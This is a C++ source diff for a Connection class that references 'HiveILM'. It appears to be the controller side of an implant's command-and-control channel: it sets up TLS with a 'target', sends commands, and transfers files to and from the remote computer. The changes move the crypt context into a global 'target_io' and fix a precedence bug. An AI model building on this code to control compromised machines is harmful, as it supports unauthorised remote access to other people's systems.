@@ -22,11 +22,14 @@ extern "C" {
 }
 
 //*****************************************************************************************
+
 using namespace InterfaceLibrary;
 using namespace InterfaceLibrary::Primitive;
 
 //*****************************************************************************************
-extern HiveILM *myILMInstance;
+
+crypt_context	*target_io;			// Command and control context for target communication
+extern HiveILM	*myILMInstance;
 
 //*****************************************************************************************
 Connection::Connection()
@@ -38,7 +41,7 @@ Connection::Connection()
 //*****************************************************************************************
 Connection::~Connection()
 {
-	crypt_close_notify(ioc->ssl);
+	crypt_close_notify(target_io);
 	close( acceptfd );
 	close( listenfd );
 	state = NOCONNECTION;
@@ -123,7 +126,6 @@ int Connection::Listen( uint16_t lport )
 int Connection::Accept( std::string& ip )
 {
 	socklen_t	len;
-	crypt_context *cc;		// Command and control connection context;
 
 	len = sizeof( local );
 
@@ -170,8 +172,7 @@ int Connection::Accept( std::string& ip )
 	cout << endl << " Enabling encrypted communications:" << endl;
 
     // from a SSL/TLS perspective, the client acts like a SSL server
-    if ( cc = crypt_setup_server(&acceptfd) != NULL)
-    {
+    if ((target_io = crypt_setup_server(&acceptfd)) == NULL) {
 		state = CONNERROR;
         D( printf( " * ERROR: crypt_setup_server() failed\n" ); )
         //printf( " ERROR: TLS connection with TLS client failed to initialize.\n" ); 
@@ -181,7 +182,7 @@ int Connection::Accept( std::string& ip )
     }
 
     // start TLS handshake
-    if ( crypt_handshake( cc->ssl ) != SUCCESS )
+    if ( crypt_handshake(target_io) != SUCCESS )
     {
 		state = CONNERROR;
         //printf( " ERROR: TLS connection with TLS client failed to initialize.\n" ); 
@@ -192,7 +193,7 @@ int Connection::Accept( std::string& ip )
 
 	cout << "  . TLS handshake complete." << endl;
 
-	if ((aes_init(ioc->ssl)) == 0) {
+	if ((aes_init(target_io)) == 0) {
 		cout << "  * Error: AES initialization failed." << endl;
 		return ERROR;
 	}
@@ -254,7 +255,7 @@ int Connection::TxCommand( struct send_buf* sbuf, REPLY *rbuf, unsigned char com
 	}
 
 // crypt_write() returns the detailed error code, but we return ERROR for all errors
-	if ( crypt_write(ioc->ssl, (unsigned char *)sbuf, 264) < 0 )
+	if ( crypt_write(target_io, (unsigned char *)sbuf, 264) < 0 )
 	{
 		//fprintf(stderr, "\tSendCommand(): failure sending request to the remote computer\n");
 //		printf( " * %s", sendCommand1String );
@@ -263,7 +264,7 @@ int Connection::TxCommand( struct send_buf* sbuf, REPLY *rbuf, unsigned char com
 	}
 
 // crypt_read() returns the detailed error code, but we return ERROR for all errors
-	if (crypt_read(ioc->ssl, (unsigned char *)rbuf, sizeof(REPLY)) < 0 )
+	if (crypt_read(target_io, (unsigned char *)rbuf, sizeof(REPLY)) < 0 )
 	{
 		//fprintf(stderr, "\tSendCommand(): failure receiving response from the remote computer\n");
 //		printf( " * %s", sendCommand2String );
@@ -298,7 +299,7 @@ int Connection::RecvFile( int fd, int size )
     {
         memset( buffer, 0, 4096 );
 
-        if ((rbytes = crypt_read(ioc->ssl, buffer, 4096) ) <= 0 )
+        if ((rbytes = crypt_read(target_io, buffer, 4096) ) <= 0 )
         {
             //fprintf(stderr, "\tRecvFile(): failure receiving data from the remote computer\n");
             printf( " * %s", recvFile1String );
@@ -325,7 +326,7 @@ int Connection::RecvFile( int fd, int size )
         size -= rbytes;
     }
 
-    if ((rbytes = crypt_read(ioc->ssl, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 )
+    if ((rbytes = crypt_read(target_io, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 )
     {
         //fprintf(stderr, "\tRecvFile(): failure receiving acknowledge from the remote computer\n");
         printf( " * %s", recvFile2String );
@@ -364,7 +365,7 @@ int Connection::SendFile( int fd, int size )
             Utilities::GenRandomBytes( (char *)&buffer[ rbytes ], ( 4096 - rbytes ), NULL, 0 );
         }
 
-        if (crypt_write(ioc->ssl, buffer, 4096) <= 0 )
+        if (crypt_write(target_io, buffer, 4096) <= 0 )
         {
             //fprintf(stderr, "\tSendFile(): failure sending data to the remote computer\n");
             printf( " * %s", sendFile1String );
@@ -374,7 +375,7 @@ int Connection::SendFile( int fd, int size )
         size -= rbytes;
     }
 
-    if ((rbytes = crypt_read(ioc->ssl, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 )
+    if ((rbytes = crypt_read(target_io, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 )
     {
         //fprintf(stderr, "\tSendFile(): failure receiving acknowledgement from the remote computer\n");
         printf( " * %s", sendFile2String );
